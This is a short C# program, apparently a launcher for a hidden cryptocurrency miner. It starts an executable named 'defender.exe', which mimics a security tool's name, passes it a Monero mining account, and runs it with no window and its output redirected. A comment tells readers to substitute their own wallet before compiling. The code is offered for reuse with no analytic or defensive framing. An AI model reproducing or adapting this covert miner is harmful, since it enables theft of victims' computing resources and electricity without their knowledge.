using System;

namespace Hide
{
    static class Program
    {
        static void Main()
        {
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.FileName = "./defender.exe";
            startInfo.Arguments = "-user dylan@thisiswhereidostuff.com -xmr 2"; //this is obviously my wallet, replace with your own
            startInfo.RedirectStandardOutput = true;                                   //before compiling
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            System.Diagnostics.Process processTemp = new System.Diagnostics.Process();
            processTemp.StartInfo = startInfo;
            processTemp.EnableRaisingEvents = true;
            try
            {
                processTemp.Start();
            }
            catch (Exception e)
            {
                throw;
            }
        }
    }
}
